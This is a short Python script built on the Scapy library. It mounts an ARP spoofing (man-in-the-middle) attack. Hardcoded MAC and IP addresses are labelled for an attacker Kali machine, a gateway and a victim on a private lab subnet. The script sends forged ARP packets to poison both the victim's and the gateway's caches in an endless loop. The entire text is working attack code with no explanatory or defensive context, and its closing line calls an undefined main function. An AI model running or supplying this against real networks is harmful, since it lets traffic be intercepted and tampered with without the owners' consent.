#!/usr/bin/env python
import random
from  scapy.all import *

hwKali = "00:00:00:00:00:04"
hwGateway = "00:00:00:00:00:03"
hwVictim = "00:00:00:00:00:05"

broadcast = "ff:ff:ff:ff:ff:ff"

ipGateway = "10.10.111.1"
ipVictim = "10.10.111.101"

pG = Ether(src = hwKali, dst = broadcast)\
   / ARP(hwsrc = hwKali, hwdst = hwGateway, psrc = ipVictim, pdst = ipGateway, op = 1)

pV = Ether(src = hwKali, dst = broadcast)\
   / ARP(hwsrc = hwKali, hwdst = hwVictim, psrc = ipGateway, pdst = ipVictim, op = 1)

while True:
  sendp(pG)
  sendp(pV)

if __name__ == "__main__": main()
